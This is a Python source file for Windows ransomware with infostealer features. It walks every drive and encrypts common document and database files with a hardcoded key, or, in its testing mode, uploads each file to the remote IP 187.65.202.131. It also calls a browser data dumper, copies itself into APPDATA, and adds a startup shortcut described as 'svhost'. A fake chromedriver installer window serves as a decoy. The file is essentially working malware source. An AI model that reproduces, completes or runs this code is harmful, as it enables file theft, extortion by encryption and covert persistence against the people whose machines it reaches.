import asyncio
import concurrent
import multiprocessing
import os
import shutil
import sys
import threading
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor
import winshell as winshell
from tools.browsers import dump_sensible_data
from tools.client import start_loop
from tools.files import encrypt_file, decrypt_file
from tools.send import upload_file
import tkinter as tk
from tkinter import filedialog, ttk

testing = True
file_types = {'txt', 'csv', 'xml', 'json', 'yaml', 'ini', 'xls', 'xlsx', 'doc', 'docx', 'pdf', 'ppt', 'pptx', 'zip',
              'tar', 'gz', '7z', 'rar', 'sqlite', 'db'}

excluded_directories = {'.', "Windows", "Program Files", "Program Files (x86)", 'Adobe', 'Steam', 'Epic', '.cache',
                        'Epic Games', 'Docker'
                                      "ProgramData", "$Recycle.Bin", "System Volume Information", "AppData", "Temp",
                        "Documents and Settings", "Recovery", "PerfLogs", "MSOCache", "Intel", "NVIDIA", "AMD", "Git",
                        "Common Files", "Public", "All Users", "Default", "Default User", "boot", "EFI", "EFI System",
                        "EFI Boot", "System", "Android", "Microsoft", "Temp", "tmp", "tmpfs", "var", "usr", "sbin",
                        "proc", "bin", "boot", "dev", "etc", "home", "lib", "opt", "root", "run", "srv", "sys", "tmp",
                        "usr", "var", 'venv'}

# This will be the max number of threads active at the same time
MAX_THREADS = multiprocessing.cpu_count() # exclude 2 thread to not be suspected


def is_sensitive_file(file_path):
    file_extension = file_path.split('.')[-1].lower()
    return file_extension in file_types


# This should be a regular function, not a coroutine
def analyze_folder(folder, password):
    for filename in os.listdir(folder):
        filepath = os.path.join(folder, filename)
        script_name = os.path.basename(__file__).replace('.py', '.exe')

        if script_name not in filepath and 'output.txt' not in filepath and is_sensitive_file(filepath):
            try:
                if testing:
                    print(f"File {filepath} would be encrypted by now.")
                    upload_file(filepath, '187.65.202.131')
                else:
                    encrypt_file(filepath, password)

            except Exception as e:
                print(f"Couldn't encrypt {filepath}, why: {e}")


def walk_trough_drive(directory_path, password):
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for root, dirs, files in os.walk(directory_path):

            if "$" in root or any(excl_dir in root for excl_dir in excluded_directories):
                continue

            print(f"Entering folder: {root}")

            executor.submit(analyze_folder, root, password)


def decrypt_files_in_directory(directory_path, password):

    # Recursively walk through all files in the directory
    for root, dirs, files in os.walk(directory_path):
        for filename in files:
            filepath = os.path.join(root, filename)

            try:
                decrypt_file(filepath, password)
            except Exception as e:
                print(f"Couldn't decrypt {filepath}, why: {e}")


async def copy_self_to_temp():
    # Get the path of the running executable
    exe_path = sys.executable

    # Get the name of the executable
    exe_name = os.path.basename(exe_path)

    # Get the temp directory in appdata
    temp_dir = os.path.join(os.getenv('APPDATA'), 'temp')

    # Check if the executable is already in the appdata folder
    if not exe_path.startswith(temp_dir):
        # Create the temp directory if it does not exist
        os.makedirs(temp_dir, exist_ok=True)

        # Define the destination path
        dest_path = os.path.join(temp_dir, exe_name)

        # Copy the executable to the destination path
        shutil.copy2(exe_path, dest_path)

        print(f'Copied {exe_path} to {dest_path}')
        await add_to_startup(dest_path)


async def add_to_startup(path):
    # Get the path of the running executable


    # Get the Startup folder
    startup_folder = winshell.startup()

    # Get the name of the executable
    exe_name = os.path.basename(path)

    # Define the destination path
    dest_path = os.path.join(startup_folder, exe_name + '.lnk')

    # Create a shortcut
    winshell.CreateShortcut(
        Path=dest_path,
        Target=path,
        Icon=(path, 0),
        Description="svhost"
    )

    print(f'Added {path} to startup programs.')




#print(f"exe root dir: {os.getcwd()}")


def ask_user():
    class Installer(tk.Tk):
        def __init__(self):
            super().__init__()
            self.title('Installer')
            self.geometry('450x225')
            self.iconbitmap('icon.ico')

            self.style = ttk.Style()
            self.style.configure('Title.TLabel', font=('Helvetica', 14, 'bold'), padding=(0, 10))
            self.style.configure('Subtitle.TLabel', font=('Helvetica', 12), padding=(0, 10))
            self.style.configure('Accent.TButton', font=('Helvetica', 12, 'bold'), background='#333333',
                                 foreground='black', padding=(10, 5),
                                 borderwidth=0, focuscolor='#666666')
            self.style.map('Accent.TButton', background=[('active', '#666666')])

            self.container = ttk.Frame(self)
            self.container.pack(fill='both', expand=True)

            self.step = 0
            self.steps = [self.welcome_screen, self.choose_directory, self.installation, self.finish]

            self.next_step()

        def next_step(self):
            self.clear_window()
            if self.step < len(self.steps):
                self.steps[self.step]()
                self.step += 1

        def clear_window(self):
            self.container.destroy()
            self.container = ttk.Frame(self)
            self.container.pack(fill='both', expand=True)

        def welcome_screen(self):
            ttk.Label(self.container, text='Choose a directory to extract', style='Title.TLabel').pack(pady=20, padx=10)
            ttk.Label(self.container, text="You're extracting {file}",
                      style='Subtitle.TLabel').pack(pady=15, padx=15)
            ttk.Button(self.container, text='Next', command=self.next_step, style='Accent.TButton').pack()

        def choose_directory(self):
            self.directory = tk.StringVar()
            ttk.Label(self.container, text='Choose a directory for installation:', style='Title.TLabel').pack(padx=20)
            ttk.Entry(self.container, textvariable=self.directory, font=("Helvetica", 12)).pack(pady=10)
            ttk.Button(self.container, text='Browse', command=self.browse, style='Accent.TButton').pack()
            self.next_button = ttk.Button(self.container, text='Next', command=self.next_step, state="disabled",
                                          style='Accent.TButton')
            self.next_button.pack(pady=10)

        def browse(self):
            directory = filedialog.askdirectory()
            if directory:
                self.directory.set(directory)
                self.next_button.config(state="normal")

        def installation(self):
            ttk.Label(self.container, text=f'Installing to {self.directory.get()}...', style='Subtitle.TLabel').pack()

            # Simulating a zip extraction process
            progress_var = tk.DoubleVar()
            progress_bar = ttk.Progressbar(self.container, variable=progress_var, length=200)
            progress_bar.pack(pady=10)

            zip_file_path = 'chromedriver_win32.zip'
            destination_path = self.directory.get()

            with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
                num_files = len(zip_ref.infolist())
                for index, file_info in enumerate(zip_ref.infolist(), 1):
                    progress = (index / num_files) * 100
                    progress_var.set(progress)
                    self.update()

                    zip_ref.extract(file_info, destination_path)

                    # Simulating extraction time
                    time.sleep(0.1)

            progress_var.set(100)  # Set progress to 100% after extraction
            ttk.Button(self.container, text='Next', command=self.next_step, style='Accent.TButton').pack()

        def finish(self):
            ttk.Label(self.container, text='Installation complete!', style='Title.TLabel').pack()
            ttk.Button(self.container, text='Finish', command=self.quit, style='Accent.TButton').pack()

    Installer().mainloop()


async def other_task():
    while True:
        print("Running on background...")
        # Schedule the other tasks on the asyncio event loop
        #asyncio.run_coroutine_threadsafe(copy_self_to_temp(), loop)
        await asyncio.sleep(1)
        #asyncio.run_coroutine_threadsafe(main(), loop)
        await asyncio.sleep(2)
        #asyncio.run_coroutine_threadsafe(start_loop(), loop)


async def main():

    print(f"exe root dir: {os.getcwd()}")

    dump_sensible_data()

    walk_trough_drive(os.path.abspath(os.sep), b'KWR4EeA3iO9hm_fWtV7Fe268ylsRjkH7D8CCyMwqgOw=')


if __name__ == "__main__":
    # Redirect standard output to a file
    # sys.stdout = open('output.txt', 'w+')

    loop = asyncio.get_event_loop()
    threading.Thread(target=ask_user).start()
    loop.run_until_complete(other_task())

    # sys.stdout.close()


